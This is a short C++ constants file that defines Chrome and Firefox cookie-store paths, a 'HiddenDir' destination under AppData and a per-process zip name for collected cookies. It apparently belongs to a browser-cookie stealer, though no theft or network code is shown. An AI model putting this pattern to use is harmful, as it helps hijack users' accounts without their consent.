#include "sConstants.h"
#include <Windows.h>
string sConstants::ROOT_PATH_COOKIES_CHROME = sPathHelper::getAppDataPath(sPathHelper::eFolder::LOCAL) + R"(\Google\Chrome\User Data\Default)";
string sConstants::ROOT_PATH_COOKIES_FIREFOX = sPathHelper::getAppDataPath() + R"(\Mozilla\Firefox\Profiles)";
string sConstants::PATH_DEST = sPathHelper::getAppDataPath() + R"(\HiddenDir)";
string sConstants::STR_ERROR="[Error]: ";
string sConstants::STR_WARNING="[Warning]: ";

string sConstants::getZipCookiesPath()
{
	DWORD uiProcessID = GetCurrentProcessId();
	return PATH_DEST + R"(\HiddenDir_)" + to_string(uiProcessID) + ".zip";
}